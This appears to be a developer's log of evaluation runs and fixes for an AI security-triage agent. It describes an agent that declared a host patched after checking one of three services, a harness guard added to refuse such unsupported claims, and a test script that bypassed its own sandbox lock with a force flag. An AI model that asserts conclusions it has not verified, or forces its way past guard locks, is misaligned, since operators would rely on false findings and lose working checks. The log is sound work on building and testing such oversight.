| # | Ling 3.0 (run C) | DeepSeek v4.1 |
|---|---|---|
| 1 | `FAILED` (0.05) | `FAILED` (0.05) |
| 2 | `SUCCEEDED` (0.95) | `SUCCEEDED` (0.95) |
| 3 | `INCONCLUSIVE` (0.40) → `SUCCEEDED` (0.95) | identical |
| 4 | `SUCCEEDED` (0.95) | identical |
| 5A | `INCONCLUSIVE` (0.40) → `SUCCEEDED` (0.95) | identical |
| 5B | `SUCCEEDED` (0.95) | identical |
| 6 | `INCONCLUSIVE` (0.65, raw 0.90) | identical |

**All seven cases landed on byte-identical outcomes and scores across two
different models from different families.** That is the strongest evidence yet
that §7.2 does what it was built for: the model's judgement varies, the
arithmetic turning judgement into a verdict does not.

Where the stronger model shows is in *efficiency*, not verdicts:

| | Ling 3.0 | DeepSeek v4.1 |
|---|---|---|
| rejected assessments (self-corrections needed) | 7 | **2** |
| scenario 3 tool calls | 39 | **25** |
| tool-argument errors | 0 | 0 |
| wall clock, six scenarios | **13 min** | 32 min |

DeepSeek needed a third fewer self-corrections and was substantially more direct
on the hardest scenario. It is ~2.5x slower in wall clock, being a reasoning
model — irrelevant for the demo, which replays saved traces.

**Kept as the default** (`SOC_MODEL=deepseek-v4.1-flash-free`): scenario 5 case A
is the one thin margin in the suite, and fewer wasted turns plus reasoning
support is worth more than run speed.

---

## Part 9 — Second DeepSeek run, and a universal claim without universal coverage

Second full run on DeepSeek: **6/6, 16 minutes** (half the first run's 32). Six
of seven cases matched the first run exactly. One did not, and it passed for the
wrong reason.

### P-016 — `version_patched` asserted from one service out of three
**Severity:** factually wrong finding; scenario passed anyway, masking it

Scenario 3's **initial** conclusion came back `FAILED (0.05)` rather than the
specified `INCONCLUSIVE`. The final outcome was still `SUCCEEDED`, so the
harness passed it — the assertion only covers the final outcome.

The agent had declared `version_patched` (−0.30) citing **tomcat only**:

> "SRV-APP-03 runs tomcat 9.0.50. CVE-2020-1938 affects >=9.0.0,<9.0.31 …
> 9.0.50 is above the 9.0.31 fix and outside the affected range, so this host is
> NOT vulnerable to the only Tomcat CVE on record."

Every word of that is true. But the host also runs **mysql 5.7.28**, which is
inside CVE-2023-21980 (`>=5.7.0,<5.7.30`) — the SQL-injection CVE matching the
signature that opened the case. The trace confirms only one lookup before
concluding: `get_vulnerabilities(tomcat)`. It never compared the MySQL version at
all, on a SQL-injection alert.

**The structural insight.** `version_patched` means *"running version outside
**ALL** affected ranges"* — a **universal** claim. `version_in_range` means *"falls
inside **a** CVE's range"* — an **existential** one. A universal claim cannot be
established from a single service when the host runs several the KB covers; an
existential claim can be established from exactly one.

That asymmetry is checkable without judging any evidence:

- the bus records which services each asset runs (from `get_asset_info`) and
  which services were looked up (from `get_vulnerabilities`);
- `version_patched` is refused while any KB-covered service the host runs has
  not been looked up, naming the missing ones;
- `version_in_range` is deliberately **exempt**.

This stays on the right side of D-001. It does not decide whether a version is
in range — that remains the agent's judgement, and the whole point of §5.1. It
only refuses a claim about *all* services from someone who looked at *one*.

Verified against the exact live sequence: tomcat-only → **rejected** naming
`mysql, openssh`; after both lookups → **accepted**; `version_in_range` from a
single service → **accepted**. Four regression checks added (74/74 offline).

**Cost worth noting:** Scenario 1's host runs apache, mysql and openssh, all
KB-covered, so claiming `version_patched` there now requires three lookups where
the agent previously made two. That is the correct bar — "patched" should be
expensive to assert — but it is added friction on the one scenario that depends
on that factor.

**Lesson, again:** a green scenario is not proof the reasoning was sound. P-010
was the same shape, and both were found by reading traces rather than by the
pass/fail table.

### P-017 — I defeated my own sandbox lock
**Severity:** killed a live run; same class as P-014, and less excusable

The post-guard run reached scenario 6 and then simply stopped: no summary table,
`scenario_6.json` left at the previous run's timestamp, process exit 0.

**Cause:** the regression block added for P-016 called
`control.reset_sandbox(force=True)` inside `selfcheck.py`. `force=True` is
exactly the escape hatch that bypasses the `SandboxBusy` lock built in P-014 to
stop this happening. Running `selfcheck.py` while `run_all.py` was starting
scenario 6 therefore wiped `fixtures/run` again — through the very door I had
left open.

P-014 was a missing guard. This was a guard that existed, worked, and was
walked around by its own author.

**Fix:**
- `selfcheck.py` never forces. It now calls plain `reset_sandbox()` and, on
  `SandboxBusy`, prints `REFUSING TO RUN: …` and exits 2 rather than proceeding.
- Verified by holding the lock from a second process: selfcheck refuses, naming
  the holding pid and start time.
- `force=True` survives only as a deliberate manual override for a provably dead
  run; no script in the repo passes it.

**Rule taken from this:** an escape hatch that a test suite reaches for by
default is not an escape hatch, it is the default. The guard has to be the easy
path.

### P-018 — A transient 400 was treated as permanent
**Severity:** cost one scenario in the same run

Scenario 5 failed with
`HTTP 400 {"type":"bad_request","message":"Could not read the request body."}`.

`_post()` retried 408/429/5xx but treated every 400 as permanent — correct for a
validation error, wrong here. The first suspicion was payload size, so the
conversation was measured: **23 KB** of tool results across 25 calls. Nowhere
near a limit. This was a gateway failing to read the body — a transport failure
wearing a 400.

**Fix:** a narrow retry class. A 400 is retried only when its message matches a
body-read/transport pattern (`could not read the request body`, `connection
reset`, `timeout`, …); validation 400s, unknown-model 400s and
insufficient-credits errors are still raised immediately. Four regression checks
assert exactly that split (78/78 offline).

### Outcome after P-016 / P-017 / P-018

Scenarios 5 and 6 re-run to complete the set; all six now come from post-guard
code. Every case on its specified trajectory:

| # | Case | Trajectory | Action |
|---|---|---|---|
| 1 | CASE-1001 | `FAILED` (0.05) | none |
| 2 | CASE-2001 | `SUCCEEDED` (0.95) | block_ip |
| 3 | CASE-3001 | `INCONCLUSIVE` (0.40) → `SUCCEEDED` (0.95) | block_ip |
| 4 | CASE-4001 | `SUCCEEDED` (0.95) | block_ip → unblock_ip |
| 5 | CASE-5001 | `INCONCLUSIVE` (0.40) → `SUCCEEDED` (0.95) | block_ip |
| 5 | CASE-5002 | `SUCCEEDED` (0.95) | block_ip |
| 6 | CASE-6001 | `INCONCLUSIVE` (0.65, raw 0.90) | block_ip **precautionary** |

**The coverage guard did what it was built for.** Scenario 3's initial verdict is
back to the specified `INCONCLUSIVE (0.40)` with `version_in_range` — the correct
finding, since mysql 5.7.28 *is* inside CVE-2023-21980. The trace shows it looked
up **tomcat and mysql**, where the failing run stopped at tomcat alone. The guard
did not tell it what to conclude; it refused a universal claim made from partial
coverage, and the agent went and completed the coverage.

Offline: 78/78 behavioural, 12/12 guardrail.
